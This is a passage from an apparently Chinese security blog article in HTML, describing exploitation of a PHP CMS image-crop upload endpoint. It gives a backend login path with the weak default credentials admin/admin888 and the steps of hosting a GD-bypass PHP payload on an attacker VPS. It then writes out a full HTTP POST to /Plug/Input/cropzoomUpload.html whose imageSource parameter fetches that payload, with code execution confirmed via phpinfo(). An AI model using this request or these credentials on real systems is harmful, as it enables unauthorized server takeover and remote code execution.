+根据你自己的图片做调整</p><p style="margin-bottom: 1.2em !important;"><img data-src="http://mmbiz.qpic.cn/mmbiz_png/fwNqC4xHXIodB3pZHbhAyl0dFXh7BLZxPRH8ia2libzW6MpZUjGMwGpgjo5rJx1Vwfo0z5UiclX4h7pibxiaaQcMYEg/0?wx_fmt=png" class="" data-type="png" data-ratio="0.3967914438502674" data-w="935" src="../Images/ebebccc6c598f1708a63690c29bc278c.png" data-original-src="http://mmbiz.qpic.cn/mmbiz_png/fwNqC4xHXIodB3pZHbhAyl0dFXh7BLZxPRH8ia2libzW6MpZUjGMwGpgjo5rJx1Vwfo0z5UiclX4h7pibxiaaQcMYEg/0?wx_fmt=png"/></p><p style="margin-bottom: 1.2em !important;">④phpinfo()代码执行验证，访问最后的文件，在网站跟目录</p><p style="margin-bottom: 1.2em !important;"><img data-src="http://mmbiz.qpic.cn/mmbiz_png/fwNqC4xHXIodB3pZHbhAyl0dFXh7BLZxLXiceddgsRhRKvVnAOtb1kqEfkiaBvhvLBicgtnvZhcL1eloYZeYYZ2eA/0?wx_fmt=png" class="" data-type="png" data-ratio="0.6254458977407847" data-w="841" src="../Images/2c6bfd7639f4403df5b3d09c51169f9d.png" data-original-src="http://mmbiz.qpic.cn/mmbiz_png/fwNqC4xHXIodB3pZHbhAyl0dFXh7BLZxLXiceddgsRhRKvVnAOtb1kqEfkiaBvhvLBicgtnvZhcL1eloYZeYYZ2eA/0?wx_fmt=png"/></p><h3 style="margin-top: 1.3em; margin-bottom: 1em; font-weight: bold; font-size: 1.3em;">0x03 网络验证</h3><p style="margin-bottom: 1.2em !important;">后台地址：http://xxxxxx/Admin/Index/login.html</p><p style="margin-bottom: 1.2em !important;">账号密码：admin admin888 弱口令</p><p style="margin-bottom: 1.2em !important;"><img data-src="http://mmbiz.qpic.cn/mmbiz_png/fwNqC4xHXIodB3pZHbhAyl0dFXh7BLZxbibmosMhs60o1Yfcxenic38UlXvXsEPVm1VTXJUdATFAjJibDGnCfiambQ/0?wx_fmt=png" class="" data-type="png" data-ratio="0.5815523059617548" data-w="889" src="../Images/800049118a94460d4a5a51bff3e74479.png" data-original-src="http://mmbiz.qpic.cn/mmbiz_png/fwNqC4xHXIodB3pZHbhAyl0dFXh7BLZxbibmosMhs60o1Yfcxenic38UlXvXsEPVm1VTXJUdATFAjJibDGnCfiambQ/0?wx_fmt=png"/></p><p style="margin-bottom: 1.2em !important;">①直接使用生成好的过GD文件payload_faith.php，并放到自己的vps上面</p><p style="margin-bottom: 1.2em !important;"><img data-src="http://mmbiz.qpic.cn/mmbiz_png/fwNqC4xHXIodB3pZHbhAyl0dFXh7BLZxPmR74KkLQFEQsQy30ayMOz4yVqSwibZiaelxy9xAD4TUwgSO7X3ZUybw/0?wx_fmt=png" class="" data-type="png" data-ratio="0.45322245322245325" data-w="962" src="../Images/5a5add52257f9fb37a49bb075445aea4.png" data-original-src="http://mmbiz.qpic.cn/mmbiz_png/fwNqC4xHXIodB3pZHbhAyl0dFXh7BLZxPmR74KkLQFEQsQy30ayMOz4yVqSwibZiaelxy9xAD4TUwgSO7X3ZUybw/0?wx_fmt=png"/></p><p style="margin-bottom: 1.2em !important;">②发送payload</p><p style="margin-bottom: 1.2em !important;"><img data-src="http://mmbiz.qpic.cn/mmbiz_png/fwNqC4xHXIodB3pZHbhAyl0dFXh7BLZx1YiacRfPSvibHsyajialicic5ib0y9hKqFFaAVstEbWavUjfzTJIRm7KYxiaA/0?wx_fmt=png" class="" data-type="png" data-ratio="0.3562708102108768" data-w="901" src="../Images/eec5fea1c96f513ee0f4a4388280a5d5.png" data-original-src="http://mmbiz.qpic.cn/mmbiz_png/fwNqC4xHXIodB3pZHbhAyl0dFXh7BLZx1YiacRfPSvibHsyajialicic5ib0y9hKqFFaAVstEbWavUjfzTJIRm7KYxiaA/0?wx_fmt=png"/></p><pre style="font-family: Consolas, Inconsolata, Courier, monospace; font-size: 1em; line-height: 1.2em; margin-top: 1.2em; margin-bottom: 1.2em;"><code style="font-size: 0.85em; font-family: Consolas, Inconsolata, Courier, monospace; margin-right: 0.15em; margin-left: 0.15em; overflow: auto; border-radius: 3px; border-width: 1px; border-style: solid; border-color: rgb(204, 204, 204); padding: 0.5em 0.7em; display: block !important;">POST /Plug/Input/cropzoomUpload.html HTTP/1.1
+Host: 104.224.134.110
+User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; rv:52.0) Gecko/20100101 Firefox/52.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+Accept-Language: zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3
+Cookie: PHPSESSID=f8gk8cjfvj1e2to5gplnh5ifi7
+Connection: close
+Upgrade-Insecure-Requests: 1
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 192
+
+viewPortW=500&amp;viewPortH=334&amp;imageX=0&amp;imageY=0&amp;imageRotate=0&amp;imageW=500&amp;imageH=334&amp;imageSource=http://x.x.x.x/payload_faith.php?1.jpg&amp;selectorX=0&amp;selectorY=0&amp;selectorW=500&amp;selectorH=334</code></pre><p style="margin-bottom: 1.2em !important;">③通过执行phpinfo()进行验证漏洞</p><p style="margin-bottom: 1.2em !important;"><img data-src="http://mmbiz.qpic.cn/mmbiz_png/fwNqC4xHXIodB3pZHbhAyl0dFXh7BLZxTVYx5YibvHFGZHia4bmm4AdyiaKC5yBQpsnSrZ4kica4D0ovRlibZxYdt9g/0?wx_fmt=png" class="" data-type="png" data-ratio="0.5962962962962963" data-w="810" src="../Images/75d9e6f62ff7527966dd2b4a38500c72.png" data-original-src="http://mmbiz.qpic.cn/mmbiz_png/fwNqC4xHXIodB3pZHbhAyl0dFXh7BLZxTVYx5YibvHFGZHia4bmm4AdyiaKC5yBQpsnSrZ4kica4D0ovRlibZxYdt9g/0?wx_fmt=png"/></p><section class="" data-tools="135&#x7F16;&#x8F91;&#x5668;" data-id="86357" style="max-width: 100%; box-sizing: border-box; color: rgb(62, 62, 62); font-size: 16px; white-space: normal; background-color: rgb(255, 255, 255); line-height: 25.6px; font-family: &#x5FAE;&#x8F6F;&#x96C5;&#x9ED1;; border-width: 0px; border-style: none; border-color: initial; word-wrap: break-word !important;"><section style="max-width: 100%; text-align: center; box-sizing: border-box !important; word-wrap: break-word !important;"><section style="display: inline-block; max-width: 100%; width: 192px; box-sizing: border-box !important; word-wrap: break-word !important;"><section class="" data-tools="135编辑器" data-id="86357" style="max-width: 100%; box-sizing: border-box; border-width: 0px; border-style: none; border-color: initial; word-wrap: break-word !important;"><section style="max-width: 100%; box-sizing: border-box !important; word-wrap: break-word !important;"><section style="display: inline-block; max-width: 100%; width: 192px; box-sizing: border-box !important; word-wrap: break-word !important;"><img class="" data-ratio="0.125" data-src="http://mmbiz.qpic.cn/mmbiz_png/fwNqC4xHXIoEGQVnQojUKQ4J1WMicVDoZmbX5NFgic65Bo4SIYUK4ib9ibvpyoaPJibpkS2Q8Q24DicBfEtnh6xBcFSw/640.png?" data-type="png" data-w="600" style="display: inline; box-sizing: border-box !important; word-wrap: break-word !important; visibility: visible !important; width: 192px !important;" title="墨迹晕染分割线" width="192px" src="../Images/c96a1b435221f7e6cf4c4e3eca199d9e.png" data-original-src="http://mmbiz.qpic.cn/mmbiz_png/fwNqC4xHXIoEGQVnQojUKQ4J1WMicVDoZmbX5NFgic65Bo4SIYUK4ib9ibvpyoaPJibpkS2Q8Q24DicBfEtnh6xBcFSw/640.png?"/></section></section></section></section></section></section><p style="max-width: 100%; min-height: 1em; color: rgb(62, 62, 62); font-size: 16px; white-space: normal; background-color: rgb(255, 255, 255); line-height: 25.6px; font-family: &#x5FAE;&#x8F6F;&#x96C5;&#x9ED1;; box-sizing: border-box !important; word-wrap: break-word !important;"><br style="max-width: 100%; box-sizing: border-box !important; word-wrap: break-word !important;"/></p><p style="max-width: 100%; min-height: 1em; color: rgb(62, 62, 62); font-size: 16px; white-space: normal; line-height: 25.6px; font-family: &#x5FAE;&#x8F6F;&#x96C5;&#x9ED1;; box-sizing: border-box !important; word-wrap: break-word !important; background-color: rgb(255, 255, 255);"><img class="" data-ratio="0.3036773428232503" data-s="300,640" data-src="http://mmbiz.qpic.cn/mmbiz_jpg/fwNqC4xHXIoEGQVnQojUKQ4J1WMicVDoZ0Y7FsbxeE68njy7pfZf9hstOTLqPHS1uljxrnicvns89MRJ7DMQowOg/640.jpeg?" data-type="jpeg" data-w="843" style="line-height: 25.6px; box-sizing: border-box !important; word-wrap: break-word !important; visibility: visible !important; width: auto !important;" width="auto" src="../Images/4f6f4b18070490b9670250379d20693d.png" data-original-src="http://mmbiz.qpic.cn/mmbiz_jpg/fwNqC4xHXIoEGQVnQojUKQ4J1WMicVDoZ0Y7FsbxeE68njy7pfZf9hstOTLqPHS1uljxrnicvns89MRJ7DMQowOg/640.jpeg?"/></p>
+        
+</body>
+</html>
